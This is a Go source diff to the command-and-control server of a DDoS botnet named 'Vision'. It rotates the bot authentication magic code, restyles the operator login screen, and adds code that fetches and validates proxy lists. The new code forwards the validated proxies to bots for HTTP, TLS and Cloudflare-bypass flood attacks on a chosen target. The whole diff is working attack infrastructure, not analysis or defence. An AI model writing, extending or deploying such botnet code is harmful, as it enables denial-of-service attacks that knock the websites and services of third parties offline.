@@ -9,6 +9,8 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
+	"net/http"
+	"net/url"
 	"os"
 	"strings"
 	"sync"
@@ -30,8 +32,8 @@ const (
 	USER_SERVER_PORT = "420"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "IhxWZGJDzdSviX$s"
-	PROTOCOL_VERSION = "r5.6-stable"
+	MAGIC_CODE       = "1a6R7s^W9DAYHc88"
+	PROTOCOL_VERSION = "V1_8"
 )
 
 type BotConnection struct {
@@ -1098,37 +1100,43 @@ func authUser(conn net.Conn, reader *bufio.Reader) (bool, *client) {
 		conn.Write([]byte("\033[0m"))       // Reset colors
 
 		conn.Write([]byte("\033[2J\033[H")) // Clear screen
-		// Stylized eye
-		conn.Write([]byte("\033[38;5;93m                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;99m                      ▄█▀▀             ▀▀█▄\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;105m                    ▄█▀   \033[38;5;196m▄▄▄▄▄▄▄▄▄\033[38;5;105m   ▀█▄\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;111m                   █▀   \033[38;5;196m█▀\033[38;5;231m██████\033[38;5;196m▀█\033[38;5;111m   ▀█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;117m                  █▌   \033[38;5;196m█\033[38;5;231m████\033[38;5;196m◉\033[38;5;231m████\033[38;5;196m█\033[38;5;117m   ▐█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;111m                   █▄   \033[38;5;196m█▄\033[38;5;231m██████\033[38;5;196m▄█\033[38;5;111m   ▄█\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;105m                    ▀█▄   \033[38;5;196m▀▀▀▀▀▀▀▀▀\033[38;5;105m   ▄█▀\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;99m                      ▀█▄▄             ▄▄█▀\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;93m                         ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[0m\r\n"))
-		conn.Write([]byte("\r\n"))
 
-		// Login box
-		conn.Write([]byte("\033[38;5;240m           \033[38;5;245m     Unauthorized attemps are logged    \033[38;5;240m│\033[0m\r\n"))
+		// Neon Futuristic Login - Cyberpunk style
+		conn.Write([]byte("\r\n"))
+		conn.Write([]byte("\033[38;5;51m     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;51m     █\033[38;5;0m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[38;5;51m█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;87m     █\033[38;5;0m░\033[38;5;201m╔════════════════════════════════════════════════════╗\033[38;5;0m░\033[38;5;87m█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;87m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m                                                    \033[38;5;201m║\033[38;5;0m░\033[38;5;87m█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;123m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m       \033[38;5;51m██╗   ██╗\033[38;5;87m██╗\033[38;5;123m███████╗\033[38;5;159m██╗\033[38;5;195m ██████╗ \033[38;5;231m███╗   ██╗\033[38;5;0m     \033[38;5;201m║\033[38;5;0m░\033[38;5;123m█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;123m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m       \033[38;5;51m██║   ██║\033[38;5;87m██║\033[38;5;123m██╔════╝\033[38;5;159m██║\033[38;5;195m██╔═══██╗\033[38;5;231m████╗  ██║\033[38;5;0m     \033[38;5;201m║\033[38;5;0m░\033[38;5;123m█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;159m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m       \033[38;5;51m██║   ██║\033[38;5;87m██║\033[38;5;123m███████╗\033[38;5;159m██║\033[38;5;195m██║   ██║\033[38;5;231m██╔██╗ ██║\033[38;5;0m     \033[38;5;201m║\033[38;5;0m░\033[38;5;159m█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;159m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m       \033[38;5;51m╚██╗ ██╔╝\033[38;5;87m██║\033[38;5;123m╚════██║\033[38;5;159m██║\033[38;5;195m██║   ██║\033[38;5;231m██║╚██╗██║\033[38;5;0m     \033[38;5;201m║\033[38;5;0m░\033[38;5;159m█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;195m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m        \033[38;5;51m╚████╔╝ \033[38;5;87m██║\033[38;5;123m███████║\033[38;5;159m██║\033[38;5;195m╚██████╔╝\033[38;5;231m██║ ╚████║\033[38;5;0m     \033[38;5;201m║\033[38;5;0m░\033[38;5;195m█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;195m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m         \033[38;5;51m╚═══╝  \033[38;5;87m╚═╝\033[38;5;123m╚══════╝\033[38;5;159m╚═╝\033[38;5;195m ╚═════╝ \033[38;5;231m╚═╝  ╚═══╝\033[38;5;0m     \033[38;5;201m║\033[38;5;0m░\033[38;5;195m█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;231m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m                        \033[38;5;201m☾ \033[38;5;51mC\033[38;5;87m2 \033[38;5;201m℣\033[38;5;0m                         \033[38;5;201m║\033[38;5;0m░\033[38;5;231m█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;231m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m                                                    \033[38;5;201m║\033[38;5;0m░\033[38;5;231m█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;195m     █\033[38;5;0m░\033[38;5;201m╠════════════════════════════════════════════════════╣\033[38;5;0m░\033[38;5;195m█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;159m     █\033[38;5;0m░\033[38;5;201m║\033[38;5;0m   \033[38;5;51m◢◤\033[38;5;245m AUTHORIZED PERSONNEL ONLY \033[38;5;51m◢◤\033[38;5;0m   \033[38;5;196m⚠ MONITORED ⚠\033[38;5;0m   \033[38;5;201m║\033[38;5;0m░\033[38;5;159m█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;123m     █\033[38;5;0m░\033[38;5;201m╚════════════════════════════════════════════════════╝\033[38;5;0m░\033[38;5;123m█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;87m     █\033[38;5;0m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[38;5;87m█\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;51m     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[0m\r\n"))
 		conn.Write([]byte("\r\n"))
 
 		// Attempt counter
 		if i > 0 {
-			conn.Write([]byte(fmt.Sprintf("\033[38;5;196m                    ⚠ Login attempt %d of 3 - Access denied\033[0m\r\n\r\n", i)))
+			conn.Write([]byte(fmt.Sprintf("\033[38;5;196m              ⚠ \033[38;5;231mLogin attempt \033[38;5;51m%d\033[38;5;231m of \033[38;5;51m3\033[38;5;231m - \033[38;5;196mAccess denied\033[0m\r\n\r\n", i)))
 		}
 
-		// Username prompt with blinking cursor effect
-		conn.Write([]byte("\033[38;5;240m           ╭──────────────────────────────────────╮\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;240m           │ \033[38;5;46m◈\033[38;5;231m Username \033[38;5;240m│\033[0m "))
+		// Neon input box
+		conn.Write([]byte("\033[38;5;201m     ┌─────────────────────────────────────────────────────┐\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;201m     │ \033[38;5;51m⬡\033[38;5;231m USER  \033[38;5;201m│\033[0m "))
 
 		username, err := getFromConnReader(reader)
 		if err != nil {
 			return false, nil
 		}
 
-		conn.Write([]byte("\033[38;5;240m           │ \033[38;5;196m◈\033[38;5;231m Password \033[38;5;240m│\033[38;5;0m\033[48;5;0m "))
+		conn.Write([]byte("\033[38;5;201m     │ \033[38;5;196m⬡\033[38;5;231m PASS  \033[38;5;201m│\033[38;5;0m\033[48;5;0m "))
 
 		password, err := getFromConnReader(reader)
 		if err != nil {
@@ -1136,21 +1144,21 @@ func authUser(conn net.Conn, reader *bufio.Reader) (bool, *client) {
 		}
 
 		conn.Write([]byte("\033[0m"))
-		conn.Write([]byte("\033[38;5;240m           ╰──────────────────────────────────────╯\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;201m     └─────────────────────────────────────────────────────┘\033[0m\r\n"))
 
-		// Authentication animation
+		// Authentication animation - neon style
 		conn.Write([]byte("\r\n"))
 		authFrames := []string{
-			"           \033[38;5;226m[■□□□□□□□□□]\033[38;5;245m Verifying credentials...\033[0m",
-			"           \033[38;5;226m[■■□□□□□□□□]\033[38;5;245m Checking database...\033[0m",
-			"           \033[38;5;226m[■■■□□□□□□□]\033[38;5;245m Validating access level...\033[0m",
-			"           \033[38;5;226m[■■■■□□□□□□]\033[38;5;245m Authenticating...\033[0m",
-			"           \033[38;5;226m[■■■■■□□□□□]\033[38;5;245m Decrypting session...\033[0m",
-			"           \033[38;5;226m[■■■■■■□□□□]\033[38;5;245m Establishing tunnel...\033[0m",
-			"           \033[38;5;226m[■■■■■■■□□□]\033[38;5;245m Loading profile...\033[0m",
-			"           \033[38;5;226m[■■■■■■■■□□]\033[38;5;245m Initializing session...\033[0m",
-			"           \033[38;5;226m[■■■■■■■■■□]\033[38;5;245m Finalizing...\033[0m",
-			"           \033[38;5;226m[■■■■■■■■■■]\033[38;5;245m Complete!\033[0m",
+			"     \033[38;5;51m[\033[38;5;201m■\033[38;5;240m□□□□□□□□□\033[38;5;51m]\033[38;5;245m Initializing secure tunnel...\033[0m",
+			"     \033[38;5;51m[\033[38;5;201m■■\033[38;5;240m□□□□□□□□\033[38;5;51m]\033[38;5;245m Encrypting handshake...\033[0m",
+			"     \033[38;5;51m[\033[38;5;201m■■■\033[38;5;240m□□□□□□□\033[38;5;51m]\033[38;5;245m Validating credentials...\033[0m",
+			"     \033[38;5;51m[\033[38;5;201m■■■■\033[38;5;240m□□□□□□\033[38;5;51m]\033[38;5;245m Checking access matrix...\033[0m",
+			"     \033[38;5;51m[\033[38;5;201m■■■■■\033[38;5;240m□□□□□\033[38;5;51m]\033[38;5;245m Decrypting session key...\033[0m",
+			"     \033[38;5;51m[\033[38;5;201m■■■■■■\033[38;5;240m□□□□\033[38;5;51m]\033[38;5;245m Establishing neural link...\033[0m",
+			"     \033[38;5;51m[\033[38;5;201m■■■■■■■\033[38;5;240m□□□\033[38;5;51m]\033[38;5;245m Loading user profile...\033[0m",
+			"     \033[38;5;51m[\033[38;5;201m■■■■■■■■\033[38;5;240m□□\033[38;5;51m]\033[38;5;245m Syncing botnet status...\033[0m",
+			"     \033[38;5;51m[\033[38;5;201m■■■■■■■■■\033[38;5;240m□\033[38;5;51m]\033[38;5;245m Finalizing connection...\033[0m",
+			"     \033[38;5;51m[\033[38;5;46m■■■■■■■■■■\033[38;5;51m]\033[38;5;46m Complete!\033[0m",
 		}
 		for _, frame := range authFrames {
 			conn.Write([]byte(fmt.Sprintf("\r%s", frame)))
@@ -1159,11 +1167,11 @@ func authUser(conn net.Conn, reader *bufio.Reader) (bool, *client) {
 		conn.Write([]byte("\r\n"))
 
 		if exists, user := AuthUser(username, password); exists {
-			// Success animation
+			// Success animation - neon green
 			conn.Write([]byte("\r\n"))
-			conn.Write([]byte("\033[38;5;46m           ╔═══════════════════════════════════════════╗\033[0m\r\n"))
-			conn.Write([]byte("\033[38;5;46m           ║   ✓ ACCESS GRANTED - WELCOME TO VISION   ║\033[0m\r\n"))
-			conn.Write([]byte("\033[38;5;46m           ╚═══════════════════════════════════════════╝\033[0m\r\n"))
+			conn.Write([]byte("\033[38;5;51m     ╔══════════════════════════════════════════════════════╗\033[0m\r\n"))
+			conn.Write([]byte("\033[38;5;51m     ║  \033[38;5;46m✓ ACCESS GRANTED\033[38;5;51m  │  \033[38;5;231mWELCOME TO THE GRID\033[38;5;51m  │  \033[38;5;201m☾℣☽\033[38;5;51m  ║\033[0m\r\n"))
+			conn.Write([]byte("\033[38;5;51m     ╚══════════════════════════════════════════════════════╝\033[0m\r\n"))
 			time.Sleep(800 * time.Millisecond)
 
 			conn.Write([]byte("\033[2J\033[H")) // Clear screen
@@ -1176,21 +1184,24 @@ func authUser(conn net.Conn, reader *bufio.Reader) (bool, *client) {
 			return true, loggedClient
 		}
 
-		// Failed animation
+		// Failed animation - neon red
 		conn.Write([]byte("\r\n"))
-		conn.Write([]byte("\033[38;5;196m           ╔═══════════════════════════════════════════╗\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;196m           ║   ✗ ACCESS DENIED - INVALID CREDENTIALS  ║\033[0m\r\n"))
-		conn.Write([]byte("\033[38;5;196m           ╚═══════════════════════════════════════════╝\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;196m     ╔══════════════════════════════════════════════════════╗\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;196m     ║  \033[38;5;231m✗ ACCESS DENIED\033[38;5;196m  │  \033[38;5;245mINVALID CREDENTIALS\033[38;5;196m  │  \033[38;5;201m⚠\033[38;5;196m   ║\033[0m\r\n"))
+		conn.Write([]byte("\033[38;5;196m     ╚══════════════════════════════════════════════════════╝\033[0m\r\n"))
 		time.Sleep(1500 * time.Millisecond)
 	}
 
-	// Final lockout message
+	// Final lockout message - neon warning
 	conn.Write([]byte("\033[2J\033[H"))
 	conn.Write([]byte("\r\n\r\n\r\n"))
-	conn.Write([]byte("\033[38;5;196m           ╔═══════════════════════════════════════════╗\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;196m           ║      ☠ ACCOUNT LOCKED - TOO MANY ATTEMPTS ☠     ║\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;196m           ║         Your IP has been logged.          ║\033[0m\r\n"))
-	conn.Write([]byte("\033[38;5;196m           ╚═══════════════════════════════════════════╝\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;196m     ╔══════════════════════════════════════════════════════════╗\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;196m     ║\033[38;5;0m                                                          \033[38;5;196m║\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;196m     ║  \033[38;5;231m☠ \033[38;5;196mSECURITY LOCKOUT\033[38;5;231m ☠  \033[38;5;245mToo many failed attempts\033[38;5;196m       ║\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;196m     ║\033[38;5;0m                                                          \033[38;5;196m║\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;196m     ║  \033[38;5;51m◢◤\033[38;5;245m Your connection has been logged and flagged \033[38;5;51m◢◤\033[38;5;196m   ║\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;196m     ║\033[38;5;0m                                                          \033[38;5;196m║\033[0m\r\n"))
+	conn.Write([]byte("\033[38;5;196m     ╚══════════════════════════════════════════════════════════╝\033[0m\r\n"))
 	time.Sleep(2 * time.Second)
 
 	conn.Close()
@@ -1229,6 +1240,103 @@ func getFromConnReader(reader *bufio.Reader) (string, error) {
 	readString = strings.TrimSuffix(readString, "\n")
 	readString = strings.TrimSuffix(readString, "\r")
 	return readString, nil
+}
+
+// ============================================================================
+// PROXY VALIDATION FUNCTIONS
+// Validates proxy lists before distributing to bots.
+// ============================================================================
+
+// fetchProxies downloads and parses a proxy list from a URL.
+// Supports formats: ip:port, user:pass@host:port, http://ip:port
+func fetchProxies(proxyURL string) ([]string, error) {
+	client := &http.Client{Timeout: 30 * time.Second}
+	resp, err := client.Get(proxyURL)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("status: %d", resp.StatusCode)
+	}
+
+	var proxies []string
+	scanner := bufio.NewScanner(resp.Body)
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
+		if line == "" || strings.HasPrefix(line, "#") {
+			continue
+		}
+		if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
+			line = "http://" + line
+		}
+		if _, err := url.Parse(line); err != nil {
+			continue
+		}
+		proxies = append(proxies, line)
+	}
+	return proxies, scanner.Err()
+}
+
+// validateSingleProxy tests if a proxy can reach httpbin.org
+func validateSingleProxy(proxyAddr string) bool {
+	proxyURL, err := url.Parse(proxyAddr)
+	if err != nil {
+		return false
+	}
+
+	transport := &http.Transport{
+		Proxy: http.ProxyURL(proxyURL),
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
+		DisableKeepAlives: true,
+	}
+
+	client := &http.Client{
+		Transport: transport,
+		Timeout:   6 * time.Second,
+	}
+
+	resp, err := client.Get("http://httpbin.org/ip")
+	if err != nil {
+		return false
+	}
+	resp.Body.Close()
+	return resp.StatusCode == http.StatusOK
+}
+
+// validateProxies tests all proxies in parallel and returns working ones
+func validateProxies(proxies []string) []string {
+	type result struct {
+		proxy string
+		valid bool
+	}
+
+	results := make(chan result, len(proxies))
+	var wg sync.WaitGroup
+
+	for _, proxy := range proxies {
+		wg.Add(1)
+		go func(p string) {
+			defer wg.Done()
+			results <- result{proxy: p, valid: validateSingleProxy(p)}
+		}(proxy)
+	}
+
+	go func() {
+		wg.Wait()
+		close(results)
+	}()
+
+	var valid []string
+	for r := range results {
+		if r.valid {
+			valid = append(valid, r.proxy)
+		}
+	}
+	return valid
 }
 
 // ============================================================================
@@ -1386,11 +1494,33 @@ func handleRequest(conn net.Conn) {
 					// Check for proxy mode: -p <proxy_url>
 					proxyMode := false
 					proxyURL := ""
+					var validatedProxies []string
 					if len(parts) >= 6 && parts[4] == "-p" {
 						// Proxy mode only for L7 methods
 						if method == "!http" || method == "!https" || method == "!tls" || method == "!cfbypass" {
 							proxyMode = true
 							proxyURL = parts[5]
+
+							// Fetch and validate proxies on CNC side
+							conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Fetching proxies from:\033[0m %s\r\n", proxyURL)))
+							proxies, err := fetchProxies(proxyURL)
+							if err != nil {
+								conn.Write([]byte(fmt.Sprintf("\033[1;31m❌ Failed to fetch proxies: %v\r\n\033[0m", err)))
+								continue
+							}
+							if len(proxies) == 0 {
+								conn.Write([]byte("\033[1;31m❌ No proxies found in list\r\n\033[0m"))
+								continue
+							}
+							conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Loaded:\033[0m %d proxies, validating against httpbin.org...\r\n", len(proxies))))
+
+							// Validate all proxies in parallel
+							validatedProxies = validateProxies(proxies)
+							if len(validatedProxies) == 0 {
+								conn.Write([]byte("\033[1;31m❌ No proxies passed validation\r\n\033[0m"))
+								continue
+							}
+							conn.Write([]byte(fmt.Sprintf("\033[38;5;46m✓ Validation complete:\033[0m %d/%d proxies working\r\n", len(validatedProxies), len(proxies))))
 						} else {
 							conn.Write([]byte("\033[1;33m⚠ Proxy mode (-p) only supported for L7 methods: !http, !https, !tls, !cfbypass\r\n\033[0m"))
 						}
@@ -1407,7 +1537,7 @@ func handleRequest(conn net.Conn) {
 					conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Duration:\033[0m %ss\r\n", duration)))
 					conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Method:\033[0m %s\r\n", method)))
 					if proxyMode {
-						conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Proxy Mode:\033[0m Enabled (fetching from %s)\r\n", proxyURL)))
+						conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Proxies:\033[0m %d validated\r\n", len(validatedProxies))))
 					}
 					conn.Write([]byte("\r\n"))
 
@@ -1425,9 +1555,11 @@ func handleRequest(conn net.Conn) {
 						conn.Write([]byte("\033[38;5;46m✓ Attack completed and removed.\033[0m\n"))
 					}(conn, ongoingAttacks[conn])
 
-					// Build command string with optional proxy flag
-					if proxyMode {
-						sendToBots(fmt.Sprintf("%s %s %s %s -p %s", method, ip, port, duration, proxyURL))
+					// Build command string - send validated proxy list directly to bots
+					if proxyMode && len(validatedProxies) > 0 {
+						// Send proxy list as comma-separated after -pl flag
+						proxyListStr := strings.Join(validatedProxies, ",")
+						sendToBots(fmt.Sprintf("%s %s %s %s -pl %s", method, ip, port, duration, proxyListStr))
 					} else {
 						sendToBots(fmt.Sprintf("%s %s %s %s", method, ip, port, duration))
 					}
